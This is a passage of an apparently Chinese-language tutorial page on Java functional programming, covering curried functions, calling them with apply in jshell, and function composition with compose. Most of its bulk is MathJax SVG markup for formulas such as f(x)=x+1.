424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(550,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(939,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1511,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2177.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3233.6,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4027.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(5028,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span> 代入不同的 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.294ex\" height=\"1.025ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 572 453\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g></g></svg></mjx-container></span>\n会返回不同的值： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16.329ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 7217.6 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(550,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(939,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1439,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2105.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(3161.6,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3883.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(4884,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5661.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(6717.6,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g></g></svg></mjx-container></span>\n纯函数只有<strong>一个输入参数</strong>，想要实现多个输入参数的纯函数比较复杂，如果作业中没有用到就不记。</p>\n<p>本质上就是把返回值的类型变成另一个函数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function&lt;输入类型<span class=\"number\">1</span>, </span><br><span class=\"line\">\t\t Funciont&lt;输入类型<span class=\"number\">2</span>, 返回值类型&gt;</span><br><span class=\"line\">\t\t&gt; f = $Lambda表达式$</span><br></pre></td></tr></table></figure>\n<p>举例，两数求和。输入参数是两个 <code>Integer</code>，返回类型是\n<code>Integer</code>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function&lt;Integer, Function&lt;Integer, Integer&gt;&gt; add = arg1 -&gt; (这是外层的返回值，应该是一个Lambda表达式);</span><br><span class=\"line\"></span><br><span class=\"line\">(这是外层的返回值，应该是一个Lambda表达式) = arg2 -&gt; arg1 + arg2;</span><br><span class=\"line\"></span><br><span class=\"line\">合起来：</span><br><span class=\"line\">Function&lt;Integer, Function&lt;Integer, Integer&gt;&gt; add = arg1 -&gt; arg2 -&gt; arg1 + arg2;</span><br></pre></td></tr></table></figure>\n<h3 id=\"调用\">1.2 调用</h3>\n<p>使用 <code>apply</code> 方法进行调用。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; add.apply(1)</span><br><span class=\"line\"><span class=\"variable\">$3</span> ==&gt; <span class=\"variable\">$Lambda</span>@1$ </span><br><span class=\"line\"></span><br><span class=\"line\">jshell&gt; add.apply(1).apply(2)</span><br><span class=\"line\"><span class=\"variable\">$4</span> ==&gt; 3\t\t  </span><br></pre></td></tr></table></figure>\n<h3 id=\"组合嵌套\">1.3 组合（嵌套）</h3>\n<p>在数学中经常有函数嵌套的写法： $$ f(x) = x + 1 \\ g(x) = x \\</p>\n<p>h(x) = g(f(x)) $$ <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.464ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.079ex\" height=\"1.464ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 477 647\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D454\" d=\"M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z\"/></g></g></g></svg></mjx-container></span> 嵌套 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.464ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.244ex\" height=\"2.059ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 550 910\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g></g></g></svg></mjx-container></span> ，就是把 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.299ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 1900 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(550,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(939,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1511,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的返回值，当做 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.133ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 1827 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D454\" d=\"M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(477,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(866,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1438,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的输入。</p>\n<p>使用 <code>compose</code> 方法，实现函数的嵌套。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Function&lt;Integer, Integer&gt; f = x -&gt; x + <span class=\"number\">1</span>;</span><br><span class=\"line\">Function&lt;Integer, Integer&gt; g = x -&gt; x * <span class=\"number\">2</span>;</span><br><span class=\"line\">Function&lt;Integer, Integer&gt; h = g.compose(f); <span class=\"comment\">// g 嵌套 f，g compose f</span></span><br></pre></td></tr></table></figure>\n<p>代码的写法很符合自然语序。</p>\n<p>使用嵌套的函数：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">jshell&gt; h.apply(<span class=\"number\">3</span>)</span><br><span class=\"line\">$<span class=\"number\">8</span> ==&gt; <span class=\"number\">8</span></span><br></pre></td></tr></table></figure>\n<p>就等价与 <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"44.253ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 19559.7 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"210E\" d=\"M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(576,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(965,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1465,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2131.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3187.6,0)\"><path data-c=\"1D454\" d=\"M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3664.6,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4053.6,0)\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4603.6,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(4992.6,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5492.6,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5881.6,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6548.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7604.1,0)\"><path data-c=\"1D454\" d=\"M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8081.1,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 